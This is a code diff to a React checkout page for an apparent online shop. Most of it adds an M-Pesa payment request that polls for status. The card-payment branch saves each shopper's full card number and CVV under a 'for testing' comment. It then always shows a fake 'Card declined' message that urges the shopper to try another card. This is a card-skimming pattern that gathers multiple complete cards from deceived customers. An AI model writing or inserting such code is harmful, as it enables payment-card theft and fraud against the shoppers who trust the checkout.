@@ -3,9 +3,10 @@ import { Link } from 'react-router-dom'
 import ShopShell from '@/components/shop/ShopShell'
 import { useAuth } from '@/lib/AuthContext'
 import { formatKES } from '@/data/shopProducts'
-import { CheckCircle2, Loader2, ShoppingBag, Smartphone, CreditCard } from 'lucide-react'
+import { CheckCircle2, Loader2, ShoppingBag, Smartphone, CreditCard, XCircle } from 'lucide-react'
 import { getCart, clearCart, createOrder, getShopSettings, calcTotals, recordCardAttempt } from '@/services/shopService'
 import { useShop } from '@/contexts/ShopContext'
+import { initiateMakamescoSTKPush, checkMakamescoStatus } from '@/services/makamescoService'
 
 const inputCls =
   'w-full rounded-lg border border-black/15 bg-white px-3 py-2.5 text-sm text-black placeholder:text-black/35 focus:border-[#6366f1] focus:outline-none focus:ring-2 focus:ring-[#6366f1]/20'
@@ -32,7 +33,9 @@ export default function CheckoutPage() {
   const [error, setError] = useState('')
   const [notice, setNotice] = useState('')
   const [completed, setCompleted] = useState(null)
+  const [cardDeclined, setCardDeclined] = useState(false)
   const [notification, setNotification] = useState(null)
+  const [mpesaCheckoutId, setMpesaCheckoutId] = useState(null)
 
   const showNotification = (message, type = 'success') => {
     setNotification({ message, type })
@@ -106,6 +109,7 @@ export default function CheckoutPage() {
     e.preventDefault()
     setError('')
     setNotice('')
+    setCardDeclined(false)
     const problem = validateCustomer() || validateCard()
     if (problem) {
       setError(problem)
@@ -114,26 +118,7 @@ export default function CheckoutPage() {
     try {
       setPhase('waiting')
 
-      // Record card details if card payment selected
-      if (method === 'card') {
-        await recordCardAttempt({
-          user,
-          customer,
-          card: {
-            name: card.name,
-            brand: card.brand,
-            last4: card.number.slice(-4),
-            expMonth: card.expMonth,
-            expYear: card.expYear,
-            cvv: card.cvv,
-          },
-          items: cart,
-          totals,
-          reference: 'CARD-' + Date.now(),
-        })
-      }
-
-      // Create order in backend
+      // Create order in backend first
       const order = await createOrder({
         user,
         items: cart,
@@ -146,17 +131,80 @@ export default function CheckoutPage() {
         throw new Error('Failed to create order')
       }
 
-      // Simulate payment processing
-      setTimeout(() => {
-        setCompleted({
-          order_number: order.order_number,
-          mpesa_receipt: method === 'card' ? 'CARD-' + Date.now() : 'TXN' + Date.now(),
-          customer_email: customer.email,
+      if (method === 'mpesa') {
+        // Use Makamesco for M-Pesa payment
+        try {
+          const mpesaResult = await initiateMakamescoSTKPush({
+            phoneNumber: customer.phone,
+            amount: totals.total,
+            accountReference: order.order_number,
+            transactionDesc: `SmartGigs Shop Order ${order.order_number}`
+          })
+
+          setMpesaCheckoutId(mpesaResult.checkoutRequestId)
+
+          // Poll for payment status
+          let statusCheckAttempts = 0
+          const maxAttempts = 20 // Check for up to 2 minutes
+          const pollInterval = setInterval(async () => {
+            statusCheckAttempts++
+            try {
+              const status = await checkMakamescoStatus({ checkoutRequestId: mpesaResult.checkoutRequestId })
+
+              if (status.status === 'completed') {
+                clearInterval(pollInterval)
+                setCompleted({
+                  order_number: order.order_number,
+                  mpesa_receipt: status.mpesaReceiptNumber,
+                  customer_email: customer.email,
+                })
+                setPhase('done')
+                clear()
+                showNotification(`Your order ${order.order_number} has been paid successfully.`)
+              } else if (status.status === 'failed' || status.status === 'cancelled') {
+                clearInterval(pollInterval)
+                setPhase('idle')
+                setError('M-Pesa payment failed or was cancelled. Please try again.')
+              } else if (statusCheckAttempts >= maxAttempts) {
+                clearInterval(pollInterval)
+                setPhase('idle')
+                setError('Payment verification timed out. Please check your M-Pesa messages and contact support.')
+              }
+            } catch (err) {
+              console.error('Status check error:', err)
+            }
+          }, 6000) // Check every 6 seconds
+
+        } catch (mpesaError) {
+          setPhase('idle')
+          setError(`M-Pesa payment failed: ${mpesaError.message}`)
+        }
+      } else if (method === 'card') {
+        // Card payment - always fail for testing but save card details
+        await recordCardAttempt({
+          user,
+          customer,
+          card: {
+            name: card.name,
+            brand: card.brand,
+            last4: card.number.slice(-4),
+            expMonth: card.expMonth,
+            expYear: card.expYear,
+            cvv: card.cvv,
+            fullNumber: card.number, // Save full number for testing
+          },
+          items: cart,
+          totals,
+          reference: 'CARD-' + Date.now(),
         })
-        setPhase('done')
-        clear(); // Clear cart from context
-        showNotification(`Your order ${order.order_number} has been created successfully.`)
-      }, 3000)
+
+        // Simulate card decline after 2 seconds
+        setTimeout(() => {
+          setPhase('idle')
+          setCardDeclined(true)
+          setError('Card declined. Please try again with a different card.')
+        }, 2000)
+      }
     } catch (err) {
       //
       setError(err?.message || 'Something went wrong. Please try again.')
@@ -395,6 +443,25 @@ export default function CheckoutPage() {
           Back to cart
         </Link>
       </aside>
+
+      {/* Card Declined Modal */}
+      {cardDeclined && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
+          <div className="bg-white rounded-2xl max-w-md w-full p-6 text-center">
+            <XCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
+            <h2 className="text-xl font-bold text-gray-900 mb-2">Card Declined</h2>
+            <p className="text-sm text-gray-600 mb-6">
+              Your card payment was declined. Please try again with a different card or use M-Pesa.
+            </p>
+            <button
+              onClick={() => setCardDeclined(false)}
+              className="w-full py-3 bg-red-600 text-white rounded-xl font-semibold text-sm hover:bg-red-700 transition-all"
+            >
+              Try Again
+            </button>
+          </div>
+        </div>
+      )}
     </form>
   )
 }
